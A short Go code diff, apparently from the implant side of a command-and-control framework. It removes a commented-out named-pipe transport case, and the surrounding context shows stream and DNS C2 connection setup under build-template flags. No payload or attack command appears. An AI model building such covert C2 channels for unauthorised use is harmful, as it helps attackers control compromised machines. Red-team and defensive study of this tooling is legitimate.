@@ -88,15 +88,6 @@ func (t *C2) StartSession() (err error) {
 			t.Connection, err = transports.SetupConnectionStream(t.Conn, t.cleanup)
 			// {{end}}
 
-		// Named pipes on Windows have additional Read & Write logic and error checks
-		// {{if .Config.NamePipec2Enabled}}
-		// case "namedpipe", "pipe":
-		//         if t.Conn == nil {
-		//                 return fmt.Errorf("Failed to create Connection: no physical connection in transport")
-		//         }
-		//         t.Connection, err = namedpipe.SetupConnectionNamedPipe(t.Conn, t.cleanup)
-		// {{end}}
-
 		// {{if .Config.DNSc2Enabled}}
 		case "dns":
 			t.Connection, err = dnsclient.SetupConnectionDNS(t.uri, t.Profile)
